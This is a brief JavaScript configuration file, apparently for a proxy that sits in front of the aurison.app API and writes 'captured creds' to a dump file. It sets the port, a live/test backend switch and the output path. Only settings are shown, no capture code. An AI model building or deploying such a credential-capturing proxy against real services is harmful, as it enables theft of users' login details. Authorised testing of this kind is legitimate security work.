import { fileURLToPath } from 'url';
import path from 'path';


export const config = {
    //GENERAL
    PORT : 55000,
    LIVE : false,       //true or false. If true, proxy uses api.aurison.app. If false, proxy uses test-api.aurison.app
    OUTPUT_FILE: ''     //If left empty, captured creds are saved in the current dir in a file called aurison-creds-dump.txt
}

config.ENV =  config.LIVE ? 'https://api.aurison.app' : 'https://test-backend.aurison.app'; //set the ENV.